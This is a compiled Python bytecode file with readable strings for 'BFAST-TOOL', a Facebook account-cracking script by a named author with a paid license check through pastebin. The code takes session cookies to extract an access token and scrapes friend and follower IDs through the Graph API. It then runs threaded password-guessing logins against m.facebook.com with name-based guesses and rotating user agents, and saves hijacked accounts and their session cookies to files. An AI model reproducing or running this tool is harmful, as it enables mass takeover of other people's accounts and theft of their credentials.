o
    n�[b[  �                   @   s�  d dl Z zd dlZW n ey   ed� e �d� Y nw zd dlZW n ey5   ed� e �d� Y nw zd dlZW n eyN   ed� e �d� Y nw zd dlZW n eyg   ed� e �d� Y nw zd dlZW n ey�   ed	� e �d� Y nw zd dlZW n ey�   ed
� e �d� Y nw zd dlZW n ey�   ed� e �d� Y nw d dlZd dl Z d dl	Z	d dlZd dl
Z
d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlmZ d dlmZ d dlmZ e�� ZejZg d�Zzed k �sedk�re�  ed ZW n e�y(   e�  Y nw e�� Zej Z!ejZ"ej#Z$ee Z%dZ&dZ'dZ(dZ)dZ*dZ+dZ,dZ-dZ.e.e'e(gZ/i i Z0Z1d\Z2a3Z4g g Z5Z6g a7g a3g Z8g Z9d a:dZ;dZ<dZ=d d!iZ>d"d#d$d%d&d'd(d)d*d+d,d-d.�Z?d/Z@d0d1� ZAg d2�ZBd3d4� ZCd5d6� ZDd7d8� ZEd9d:� ZFd;d<� ZGd=d>� ZHd?d@� ZIG dAdB� dB�ZJdCdD� ZKeK�  eLdEk�r�eG�  dS dS )F�    Nu)   
 [×] requests module not installed!...
zpip install requestsu(   
 [×] Futures module not installed!...
zpip install futuresu$   
 [×] Bs4 module not installed!...
zpip install bs4u1   
 [脳] The requests module is not installed!...
u0   
 [脳] Futures module is not installed yet!...
u,   
 [脳] Bs4 module is not installed yet!...
u)   
 [脳] Rich module is not installed!...
zpip install rich)�ThreadPoolExecutor)�datetime)�BeautifulSoup)ZJANZFEBZMARZAPRZMAYZJUNZJULZAUGZSEPZOCTZNOVZDEC�   �   z[1;97mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[0mz[1;30m)r   r   r   zhttps://lookup-id.com/zhttps://m.facebook.comzhttps://www.httpbin.org/ip�
user-agentz�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]�January�FebruaryZMarchZApril�MayZJuneZJulyZAugustusZ	SeptemberZOctoberZNovemberZDecember)�01�02�03�04Z05Z06Z07Z08Z09Z10Z11Z12Fc                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )N�
g{�G�z�?)�sys�stdout�write�flush�time�sleep)�z�e� r   �lll.py�xoxc   s
   
�r   )z�Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/247.0.0.5.130;]z�nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+ Opera/7.1z�Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]z�Mozilla/5.0 (Linux; Android 8.0.0; LDN-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]z�Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]z�Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]z�Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/283.0.0.6.117;]z�Mozilla/5.0 (Windows NT 10.0; OPPSS :)64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]c                	   C   sD   t �d� tdt � td� tdtttttttf � td� d S )N�clearua  %s
  _      _______      _______ _____  
 | |    |  __ \ \    / /_   _|  __ \ 
 | |    | |  | \ \  / /  | | | |__) |
 | |    | |  | |\ \/ /   | | |  ___/ 
 | |____| |__| | \  /   _| |_| |     
 |______|_____/   \/   |_____|_|    
                                              
 
[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m
	 [➣] OWNER :        Sajadalbkat
	 [➣] TELEGRAM:        FFRFF9
	
[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m
	
[0;91m         USE FLIGHT MODE FOR 3 SEC
[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m                                                                          � u7                %s√%s√%s√%sBFAST-TOOL%s√%s√%s√)�os�system�print�M�H�N�Br   r   r   r   �logov   s   
�r$   c                   C   s   t dttf � d S )Nu�   %s════════════════════════════════════════════%s
)r   �Zr"   r   r   r   r   �linex�   s   r&   c                 C   sh   t | �dkst |�dkr'td� tdtt t��tt |��f � tj��  d S tdttf � t�  d S )Nr   z'
[92;1m THE PROCESS HAS BEEN COMPLETEDz/[93;1m TOTAL [92;1mOK[93;1m/[91;1mCP: %s/%sz'

 [%s!%s] NO RESULT YOUR BAD LOCK :(:()�lenr   �str�okr   r   �exitr!   )�OK�cpr   r   r   �result�   s
    r-   c                  C   st  t �d� t�  tdttttf �} z^tjddddddd	d
ddd�	d| id�}t�	d|j
�}|d u r4dnd|�d� }tdd��|�d�� tdd��| � tjd|�d� d| id��� d }tdt � t�d� t�  W d S  ty�   tdtttf � t�d� t�  Y d S  ty�   tdtttf � t�d� t�  Y d S  tjjy�   tdtttf � Y d S w )Nr   z
 %s[%s?%s] ENTER COOKIES : %sz0https://business.facebook.com/business_locationsz�Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36zhttps://www.facebook.com/zbusiness.facebook.comzhttps://business.facebook.com�1z#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7�	max-age=0zUtext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8ztext/html; charset=utf-8)	r   �referer�host�origin�upgrade-insecure-requests�accept-language�cache-control�accept�content-type�cookie)�headers�cookiesz	(EAAG\w+)z&
* FAIL : MAYBE YOUR COOKIE INVALID !!z
* YOUR FB ACCESS TOKEN : r   �
.token.txt�a�.cookes.txt�-https://graph.facebook.com/me?access_token=%s�r:   �namez
%s LOGIN SUCCESSFUL...! �   u   
 %s[%s×%s] INVALID COOKIES�

 %s[%s!%s] NO CONNECTION
)r   r   r$   �inputr    r"   �requests�get�re�search�text�group�openr   �jsonr   r   r   �	didhdhdjs�AttributeErrorr   �sajad�UnboundLocalError�
exceptions�ConnectionErrorr*   )r8   �dataZ
find_tokenZhasilZnamar   r   r   rN   �   s@   
���$((�rN   c                  C   s�  t �d� t �d� t�  t�t��� } | d }ztdd��� }tdd��� }W n t	yG   t
dtttf � t�d� t �d	� t�  Y nw ztjd
| d|id��� d �d�d �� }W n7 ty�   t
dtttf � t�d� t �d	� t �d� t�  Y n tjjy�   tdtttf � Y nw ztjddddd�d��� }|d }|d �� }W n ty�   d}Y nw t
dtttttt|f � t
dtttttt|f � t
dtttttt|f � t
dttttttf � t
d� t
dttttf � t�d � t
d!tttttf � t�d � t
d"tttttf � t�d � t
d#ttttf � t�d � t
d$tttttf � t�d � td%tttf �}|dk�rbt
d&tttf � t�d� t�  n�|d'v �r�z2td(ttf �}	tjd)|	� d*|� �d|id��� d+ }
|
d, D ]}t�|d- d. |d  � �q�W n� t�y�   t
d/tttf � t�d0� t�  Y n�w |d1v �r�t||� n�|d2v �r�t||� n�|d3v �r�td4�}zt|d��� D ]
}t�|�� � �q�W nh   t
d5tttt|tf � t�d0� Y nR|d6v �r=t
d� g d7�}|D ]}tj �!d8ttt|f � tj �"�  t�d9� �qt �d	� t �d:� td;ttttf � nt
d<tttt|tf � t�d� t�  t#� �$t�S )=Nzgit pullr   r2   r;   �rr=   u   
 %s[%s×%s] INVALID TOKENrA   zrm -rf .token.txtr>   r8   r?   r@   � r   zrm -rf .cokie.txtrB   zhttp://ip-api.com/json/zhttp://ip-api.com/zapplication/json; charset=utf-8��Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36)ZRefererzContent-Typez
User-Agent�r9   �queryZcountryu    %s [%s➣%s] %sNAME     %s: %s%su    %s [%s➣%s] %sIP       %s: %s%su    %s [%s➣%s] %sCOUNTRY  %s: %s%su>   %s [%s➣%s] %sSTATUS %s  : %sPREMIUM [91;1m✓[94;1m✓[0mr   z%s [%s01%s] %sCRACK FROM PUBLICg���Q��?u1   %s [%s02%s] %sCRACK FROM PUBLIC %s   [BULK✓✓]z+%s [%s03%s] %sCRACK FROM FOLLOWERS %s[BULK]z%s [%s04%s] %sCRACK FROM FILEz%s [%s00%s] %sLOGOUT %sz
 %s[%ssajad%s] MENU : u   
 %s[%s×%s] DON'T EMPTY... !)r.   r   u   %s [➣] INPUT PUBLIC ID : %s�https://graph.facebook.com/�-?fields=friends.fields(id,name)&access_token=�friendsrR   �id�|u   
 %s[%s×%s] FOOL ID NOT PUBLIC�   )�2r   )�3r   )�4r   z[92;2m  INPUT FILE: uG   
 %s[%s×%s] FILE [%s%s%s] NOT FUND FIRST DUMP CHECK 1 TO 4 OPTIONS BRO)�0Z00)�[1;92m.   �[1;93m..  �[1;96m... rb   rc   rd   u    %s[%s➣%s] DELETING TOKEN %sr   zrm -rf .cookes.txtu*   
 %s[%s✓%s]%s SUCCESSFULLY DELETED TOKENu:   
 %s[%s➣%s] MENU [%s%s%s] NOT FOUND, CHECK THE MENU BRO!)%r   r   r$   rD   rE   �url_iprK   rJ   �read�IOErrorr   r    r"   r   r   rN   �rsplit�upper�KeyErrorrP   rQ   r*   rC   r!   rL   r[   �append�_ngocok_�
_follower_�	readlines�stripr   r   r   r   �	__crack__�plerr)ZipmZIPZtokenzZcookZnamr<   �ip�locZpepek�userrS   �x�filelist�lineZtitikr   r   r   rL   �   s�   

0�0:�4   
$
&�&�


�&
"

(rL   c              
   C   s�   zt tdtttttf ��}W n   d}Y t|�D ]Q}|d7 }tdttt|tf �}z)tjd|� d| � �d|id��� d }|d	 D ]}t�	|d
 d |d  � qCW q t
tfyk   td� t�d� t�  Y qw d S )N�    
 %s[%s➣%s] ENTER LIMIT %s:%s r   u$    [%s➣%s] ENTER PUBLIC ID %s%s%s : rX   rY   r8   r?   rZ   rR   r[   r\   r@   �   
 [➣] FOOL ID NOT PUBLICr]   )�intrC   r"   r    �rangerD   rE   rK   r[   rk   rj   rg   r   r   r   rL   �Z__ppk__ZcokZ
nanya_keunZmnhrt   rS   ru   r   r   r   rl   �   s   &���rl   c              
   C   s�   zt tdtttttf ��}W n   d}Y t|�D ]P}|d7 }tdttt|tf �}z(tjd|� d| � d�d|id��� }|d	 D ]}t�	|d
 d |d  � qBW q t
tfyj   td� t�d� t�  Y qw d S )Nrx   r   u    [%s➣%s] ENTER ID %s%s%s : z https://graph.facebook.com/v1.0/z/subscribers?access_token=z&limit=5000r8   r?   rR   r[   r\   r@   ry   r]   )rz   rC   r    r"   r{   rD   rE   rK   r[   rk   rj   rg   r   r   r   rL   r|   r   r   r   rm     s   $���rm   c                   @   s,   e Zd Zdd� Zdd� Zdd� Zdd� Zd	S )
rp   c                 C   s
   g | _ d S �N)r[   ��selfr   r   r   �__init__  s   
z__crack__.__init__c                    s  |� _ tdtttt� j �tf � tdttf �}|dv rotdtttf � tdttf � 	 tdttf �}tdt|tf � |d	krNtd
tttf � n t|�dkr^tdtttf � nd� fdd�	}||�d�� d S q/|dv ry� ��  d S tdtttf � � �	|� d S )Nu   
 [%s➣%s] TOTAL ID : %s%s%su/    [%s➣%s] USE DEFAULT /MANUAL PASSWORD [d/m]: )r    �mz)
 %s[%s!%s] USE , (COMMA) FOR SEPARATOR .z-
 %s[!] EXAMPLE: %s123456,1234567,223344 ETC.Tu   
 [%s➣%s] ENTER PASSWORD : u(    [➣] CRACK WITH PASSWORD -> [ %s%s%s ]r   u)   
 %s[%s×%s] DON'T EMPTY THE PASSWORD BRO�   u*   
 %s[%s×%s] PASSWORD MINIMUM 6 CHARACTERSc                    s�   t �  tdtt� j�� � td� td� t�  tdd��%}� jD ]}z|�d�d }|�� j	|| d� W q"   Y q"W d   � n1 sFw   Y  t
tt� d S )	Nz[91;1m sajad IDS : [92;3mz.[91;1m FOOL CLONING HAVE START PLS WAIT..[0muf   [91;1m WE ARE ANONYMOUS. WE ARE LEGION. WE DO NOT FORGIVE.  WE DO NOT FORGET.[91;1m✘[93;1m✘[0m�   �Zmax_workersr\   r   �m.facebook.com�r$   r   r(   r'   r[   r&   �sajada�splitZsubmit�
__metode__r-   r)   r,   )ZyscZ	__sajad__ZikehZkimochir~   r   r   �__shristy__1  s   

��z$__crack__.plerr.<locals>.__shristy__�,)�D�du   
 %s[%s×%s] m/d IDIOT!r}   )
r[   r   r    r"   r'   rC   r�   �__pler__r!   rq   )r   r[   Z___mrerror___Znunur�   r   r~   r   rq   "  s(   � z__crack__.plerrc              "   C   s�  t �t�}tj�d|� dt� dt� t� t	� dt
� t| j�� t� dt� dt� tt�� t	� dt
� tt�� t� dt� dt
� d�ttt| j�� �� t� d��f tj��  z�|D ]�}|�� }t�� }t �dd	g�}|d
t �g d��dd
ddddddddd�}|jd|� d�|d�j}	t�dt|	���d�t�dt|	���d�|d|dd�}
|dd
d| d |ddddddd| d! ddd"�}|jd|� d#�|
|d$d%�}d&|j�� v �r	d'�d(d)� |j�� � � D ��}t!dt� d*|� d+|� t� �� d,||f }t�"|� t#d-t$t%t&f d.��d/| �  n3d0|j�� v �r;t!dt	� d1|� d+|� t� �� d2||f }t�"|� t#d3t$t%t&f d.��d/| � qUqUtd7 aW d S    | �'|||� Y d S )4Nz z[sajad] �[�-z] z{:.1%}z]  z|Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4772.0 Mobile Safari/537.36 EdgA/95.0.1020.48r.   )rU   z�Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)z�Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36z{Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36z�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9zmark.via.gpzsame-origin�cors�emptyZdocumentzmbasic.facebook.com/zgzip, deflate brzen-GB,en-US;q=0.9,en;q=0.8)�Hostr3   r   r6   Zdnt�x-requested-with�sec-fetch-site�sec-fetch-mode�sec-fetch-user�sec-fetch-destr0   �accept-encodingr4   zhttps://z
/index.phprV   zname="lsd" value="(.*?)"r   zname="jazoest" value="(.*?)"Zlogin_no_pinzhttps://m.facebook.com/home.php)ZlsdZjazoest�uidZflow�pass�nextr/   z!application/x-www-form-urlencodedzV/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F)r�   r5   r3   r2   r7   r   r6   r�   r�   r�   r�   r�   r0   r�   r4   z-/login/device-based/validate-password/?shbl=0F)rR   r9   �allow_redirectsZc_user�;c                 S   s   g | ]
\}}|d  | �qS )�=r   )�.0�key�valuer   r   r   �
<listcomp>X  s    z(__crack__.__metode__.<locals>.<listcomp>z[sajad-OK] r\   u    [✓] %s|%szOK/OK-%s-%s-%s.txtr<   z%s
�
checkpointz[sajad-CP] u    [×] %s|%szCP/CP-%s-%s-%s.txt)(�random�choice�my_colorr   r   r   r%   r!   �loop�Pr    r'   r[   r)   r,   r"   �format�floatr   �lowerrD   �SessionrE   rH   rF   rG   r(   rI   �postr:   �get_dict�join�itemsr   rk   rJ   �ha�op�tar�   )r   rt   r�   ZxxnZwarna�pw�session�ugentZheaders1�pZdataaZheaders2ZpoZcokiZwrtr   r   r   r�   H  s:   
�
*60

 z__crack__.__metode__c                 C   s0  t �  tdtt| j�� � td� td� t�  tdd��k}| jD ]_}zX|�d�\}}|�d�}t|�dksIt|�d	ksIt|�d
ksIt|�dkr^||d d |d |d  |d d g}n||d d |d |d  |d d g}|�| j	||d� W q"   Y q"W d   � n1 s�w   Y  t
tt� d S )Nz[91;1m sajad IDS : [91;1mz/[91;1m FOOL CLONING HAVE START PLS WAIT...[0muf   [91;1m WE ARE ANONYMOUS. WE ARE LEGION. WE DO NOT FORGIVE.  WE DO NOT FORGET.[91;1m√[93;1m√[0mr�   r�   r\   rT   r]   �   r�   �   r   Z123r   Z12345r�   r�   )r   ZkirimZyntktsr�   r@   �xzZpwxr   r   r   r�   k  s&   

0*(��z__crack__.__pler__N)�__name__�
__module__�__qualname__r�   rq   r�   r�   r   r   r   r   rp     s
    &#rp   c                  C   s�   t �  td� td� tt�� �tt�� � } d�| �}td| � z=t�d�j	}||v r?td� tt�� �}t
�d� W d S td� td	� t�d
| d � td� t
�d� t��  W d S    t��  tdkrutt � t�  Y d S Y d S )Nz$[1;97m	YOUR ID IS NOT YET APPROVED
z        TOOL  | WEEKS
r�   z[37;1m     YOUR ID : zhttps://pastebin.com/7MHy9yFkz)[1;92m          APPROVAL IS DETECTED...!rA   z,  IF PAYMENT IS SUCCESSFUL SEND YOUR ID...
z1[1;91m  FREE USERS FUK OFF DONT INBOX ME.[sajad]zSam start https://wa.me/+9647718493834?text=Hi+sajad+i+Want+to+pay+for+this+linces:+z
>/dev/nullr   �__main__)r$   r   r(   r   �geteuid�getloginr�   rD   rE   rH   r   r   r   Zjedar   r*   r@   �xoshnaw)Zuuidr[   ZhttpCaht�msgr   r   r   r�   �  s0   


�r�   r�   )Mr   rD   �ImportErrorr   r   Zconcurrent.futuresZ
concurrentZbs4ZrichrF   r   rK   r   r�   r   �
subprocess�	threading�	itertools�base64�zlibr   r�   r   �now�ct�month�nZbulanr*   ZnTemp�
ValueError�current�yearr�   Zbu�dayr�   r�   r�   r    r!   �Kr#   �U�Or"   r%   r�   rR   Zdata2Zamanr,   ZsalahZubahPZpwBarur)   r[   rt   r�   Z
url_lookupZurl_mbre   Zheader_grupZ	bulan_ttl�doner   r�   r$   r&   r-   rN   rL   rl   rm   rp   r�   r�   r   r   r   r   �<module>   s�   �������p
�



	!Ac

�